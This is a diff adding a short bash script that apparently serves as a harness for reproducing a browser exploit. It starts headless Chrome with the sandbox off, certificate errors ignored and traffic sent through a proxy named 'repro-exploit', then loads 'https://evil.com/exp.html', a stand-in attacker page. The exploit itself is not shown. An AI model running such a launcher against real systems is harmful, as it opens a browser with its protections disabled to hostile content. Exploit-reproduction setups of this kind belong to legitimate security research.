@@ -1,0 +1,8 @@
+#!/usr/bin/bash
+
+CHROME=/opt/chrome-linux64/chrome
+
+echo "Version: $($CHROME --version | head -n1)"
+
+dbus-daemon --system
+dbus-run-session -- $CHROME --headless=new --no-sandbox --disable-crashpad --disable-breakpad --disable-crash-reporter --enable-logging=stderr --user-data-dir=/home/user --proxy-server='http://repro-exploit:1337' --ignore-certificate-errors "https://evil.com/exp.html"
